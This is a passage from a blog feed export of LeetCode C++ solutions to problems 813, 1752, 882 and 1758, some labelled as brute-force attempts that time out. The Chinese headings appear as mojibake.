class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; len<span class="number">-1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = j+<span class="number">1</span>; p &lt; len; p++) &#123;</span><br><span class="line">                    left_avg[i+<span class="number">1</span>][p] = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j), left_avg[i+<span class="number">1</span>][p]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> maxx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                maxx = <span class="built_in">max</span>(left_avg[i][j]+<span class="built_in">double</span>(sum[len] - sum[j])/(len-j), maxx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>å‡å°‘maxxè®¡ç®—æ¬¡æ•°</p></blockquote><h2 id="1752-æ£€æŸ¥æ•°ç»„æ˜¯å¦ç»æ’åºå’Œè½®è½¬å¾—åˆ°"><a href="#1752-æ£€æŸ¥æ•°ç»„æ˜¯å¦ç»æ’åºå’Œè½®è½¬å¾—åˆ°" class="headerlink" title="1752. æ£€æŸ¥æ•°ç»„æ˜¯å¦ç»æ’åºå’Œè½®è½¬å¾—åˆ°"></a><a href="https://leetcode.cn/problems/check-if-array-is-sorted-and-rotated/">1752. æ£€æŸ¥æ•°ç»„æ˜¯å¦ç»æ’åºå’Œè½®è½¬å¾—åˆ°</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len &amp;&amp; nums[i<span class="number">-1</span>] &lt;= nums[i]) i++;</span><br><span class="line">        <span class="keyword">if</span>(i == len) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        j = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j &lt; len &amp;&amp; nums[j<span class="number">-1</span>] &lt;= nums[j]) j++;</span><br><span class="line">        <span class="keyword">return</span> j == len &amp;&amp; nums[len<span class="number">-1</span>] &lt;= nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="882-ç»†åˆ†å›¾ä¸­çš„å¯åˆ°è¾¾èŠ‚ç‚¹"><a href="#882-ç»†åˆ†å›¾ä¸­çš„å¯åˆ°è¾¾èŠ‚ç‚¹" class="headerlink" title="882. ç»†åˆ†å›¾ä¸­çš„å¯åˆ°è¾¾èŠ‚ç‚¹"></a><a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/">882. ç»†åˆ†å›¾ä¸­çš„å¯åˆ°è¾¾èŠ‚ç‚¹</a></h2><h2 id="æš´æœè¶…æ—¶"><a href="#æš´æœè¶…æ—¶" class="headerlink" title="æš´æœè¶…æ—¶"></a>æš´æœè¶…æ—¶</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; graph;</span><br><span class="line">    vector&lt;<span class="type">bool</span>&gt; global_visited;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; copy_edges;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> edge_size = edges.<span class="built_in">size</span>();</span><br><span class="line">        graph = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n);</span><br><span class="line">        global_visited = <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>);</span><br><span class="line">        copy_edges = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(edge_size, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edge_size; i++) &#123;</span><br><span class="line">            graph[edges[i][<span class="number">0</span>]].<span class="built_in">push_back</span>(i);</span><br><span class="line">            graph[edges[i][<span class="number">1</span>]].<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(std::<span class="built_in">move</span>(edges), <span class="number">0</span>, maxMoves);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edge_size; i++) &#123;</span><br><span class="line">            res += <span class="built_in">min</span>(edges[i][<span class="number">2</span>], copy_edges[<span class="number">0</span>][i] + copy_edges[<span class="number">1</span>][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(global_visited[i]) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;&amp; edges, <span class="type">int</span> node, <span class="type">int</span> move)</span> </span>&#123;</span><br><span class="line">        global_visited[node] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(move &lt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> e : graph[node]) &#123;</span><br><span class="line">            <span class="type">int</span> w = edges[e][<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> next = edges[e][<span class="number">0</span>] == node ? edges[e][<span class="number">1</span>] : edges[e][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> direction = edges[e][<span class="number">0</span>] == node ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            copy_edges[direction][e] = <span class="built_in">max</span>(<span class="built_in">min</span>(w, move), copy_edges[direction][e]);</span><br><span class="line">            <span class="keyword">if</span>(move &gt; w) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(std::<span class="built_in">move</span>(edges), next, move-w<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="djikstra-é¢˜è§£"><a href="#djikstra-é¢˜è§£" class="headerlink" title="djikstra-é¢˜è§£"></a>djikstra-é¢˜è§£</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">encode</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> u * n + v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; <span class="built_in">adList</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = edge[<span class="number">0</span>], v = edge[<span class="number">1</span>], nodes = edge[<span class="number">2</span>];</span><br><span class="line">            adList[u].<span class="built_in">emplace_back</span>(v, nodes);</span><br><span class="line">            adList[v].<span class="built_in">emplace_back</span>(u, nodes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; used;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; visited;</span><br><span class="line">        <span class="type">int</span> reachableNodes = <span class="number">0</span>;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        pq.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>() &amp;&amp; pq.<span class="built_in">top</span>().first &lt;= maxMoves) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [step, u] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (visited.<span class="built_in">count</span>(u)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            visited.<span class="built_in">emplace</span>(u);</span><br><span class="line">            reachableNodes++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [v, nodes] : adList[u]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nodes + step + <span class="number">1</span> &lt;= maxMoves &amp;&amp; !visited.<span class="built_in">count</span>(v)) &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(nodes + step + <span class="number">1</span>, v);</span><br><span class="line">                &#125;</span><br><span class="line">                used[<span class="built_in">encode</span>(u, v, n)] = <span class="built_in">min</span>(nodes, maxMoves - step);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = edge[<span class="number">0</span>], v = edge[<span class="number">1</span>], nodes = edge[<span class="number">2</span>];</span><br><span class="line">            reachableNodes += <span class="built_in">min</span>(nodes, used[<span class="built_in">encode</span>(u, v, n)] + used[<span class="built_in">encode</span>(v, u, n)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reachableNodes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1758-ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°&quot;&gt;&lt;a href=&quot;#1758-ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°&quot; class=&quot;headerlink&quot; title=&quot;1758. ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-changes-to-make-alternating-binary-string/&quot;&gt;1758. ç”Ÿæˆäº¤æ›¿äºŒè¿›åˆ¶å­—ç¬¦ä¸²çš„æœ€å°‘æ“ä½œæ•°&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;minOperations&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string s)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = s.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;cal&lt;/span&gt;(s, len, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;cal&lt;/span&gt;(s, len, &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; string&amp;amp; s, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len, &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flag &amp;amp;&amp;amp; s[i] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt; || !flag &amp;amp;&amp;amp; s[i] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flag = !flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&quot;813-æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„&quot;&gt;&lt;a href=&quot;#813-æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„&quot; class=&quot;headerlink&quot; title=&quot;813. æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/largest-sum-of-averages/&quot;&gt;813. æœ€å¤§å¹³å‡å€¼å’Œçš„åˆ†ç»„&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&quot;è¶…æ—¶æš´æœ&quot;&gt;&lt;a href=&quot;#è¶…æ—¶æš´æœ&quot; class=&quot;headerlink&quot; title=&quot;è¶…æ—¶æš´æœ&quot;&gt;&lt;/a&gt;è¶…æ—¶æš´æœ&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt; sum;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;largestSumOfAverages&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        len = nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sum = &lt;span class=&quot;built_in&quot;&gt;vector&lt;/span&gt;&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;(len+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;lt;= len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            sum[i] = nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] + sum[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; K, &lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; left_value, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; last_j)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(k == K || i == len) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; left_value + (sum[len] - sum[last_j] + &lt;span class=&quot;number&quot;&gt;0.0&lt;/span&gt;) / (len - last_j);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k, i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, K+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, left_value + (sum[i] - sum[last_j] + &lt;span class=&quot;number&quot;&gt;0.0&lt;/span&gt;)/(i-last_j), i), &lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k,i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, K, left_value, last_j));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; a, &lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; b)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a &amp;gt; b ? a : b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
